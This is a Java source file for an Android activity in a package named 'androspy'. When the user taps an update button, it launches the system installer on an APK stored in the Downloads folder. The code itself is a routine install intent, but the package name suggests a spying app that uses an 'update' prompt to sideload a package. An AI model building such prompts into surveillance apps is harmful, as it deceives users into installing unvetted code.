package buddy.ap.com.androspy;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import java.io.File;

public class PromptUpdateActivity extends AppCompatActivity {
    private Button btnUpdate;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_prompt_update);

        btnUpdate = (Button) findViewById(R.id.update_btn);

        btnUpdate.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                doUpdate();
            }
        });
    }

    private void doUpdate() {
        File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), UpdateApp.PKG_FILE);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
        getApplicationContext().startActivity(intent);
    }
}
